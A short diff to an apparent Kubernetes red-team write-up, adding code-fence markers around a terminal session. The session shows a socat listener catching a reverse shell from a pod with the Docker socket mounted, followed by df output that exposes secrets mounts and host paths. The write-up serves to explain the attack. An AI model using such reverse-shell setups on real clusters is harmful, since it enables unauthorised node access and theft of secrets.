@@ -25,6 +25,7 @@ mountPath: "/var/run/docker.sock"
 
 So we should have access to all the node context.You can check it very easily:
 
+'''
 tux at basecamp in ~/code/github/redteam-gkpown (master●●)
 $  socat file:`tty`,raw,echo=0 tcp-listen:9532
 /bin/sh: can't access tty; job control turned off
@@ -49,5 +50,5 @@ tmpfs                     6.4G     12.0K      6.4G   0% /run/secrets/kubernetes.
 tmpfs                     6.4G         0      6.4G   0% /proc/kcore
 tmpfs                     6.4G         0      6.4G   0% /proc/timer_list
 tmpfs                     6.4G         0      6.4G   0% /sys/firmware
-
+'''
 
